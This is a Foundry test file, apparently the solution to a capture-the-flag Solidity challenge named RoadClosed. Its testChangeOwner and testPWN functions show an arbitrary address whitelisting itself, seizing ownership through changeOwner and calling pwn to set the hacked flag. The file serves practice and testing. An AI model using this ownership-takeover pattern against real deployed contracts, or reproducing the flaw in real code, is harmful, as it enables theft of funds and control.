// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import {Test} from "forge-std/Test.sol";
import {RoadClosed} from "../src/RoadClosed.sol";

contract TestRoadClosed is Test {
    RoadClosed roadClosed;

    function setUp() public {
        roadClosed = new RoadClosed();
    }

    function testIsOwner() public {
        assertTrue(roadClosed.isOwner());
    }

    function testIsContract() public {
        assertTrue(roadClosed.isContract(address(roadClosed)));
    }

    function testChangeOwner() public {
        vm.prank(address(1));
        roadClosed.addToWhitelist(address(1));

        vm.prank(address(1));
        roadClosed.changeOwner(address(1));

        vm.prank(address(1));
        assertTrue(roadClosed.isOwner());
    }

    function testPWN() public {
        testChangeOwner();
        vm.prank(address(1));
        roadClosed.pwn(address(1));
        assertTrue(roadClosed.isHacked());
    }
}